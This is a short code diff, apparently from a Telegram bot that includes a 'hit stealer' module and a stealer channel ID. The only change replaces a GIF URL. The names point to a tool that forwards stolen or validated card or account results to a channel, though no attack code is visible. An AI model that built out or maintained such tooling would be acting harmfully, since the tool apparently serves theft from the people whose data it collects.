@@ -10,7 +10,7 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 
 # Updated Stealer Channel ID
 STEALER_CHANNEL_ID = -1003627495953
-COOKING_GIF = "https://raw.githubusercontent.com/manus-ai/assets/main/egg_cooking.gif"
+COOKING_GIF = "https://files.catbox.moe/wmq01l.mp4"
 
 async def send_hit_if_approved(client: Client, text: str):
     try:
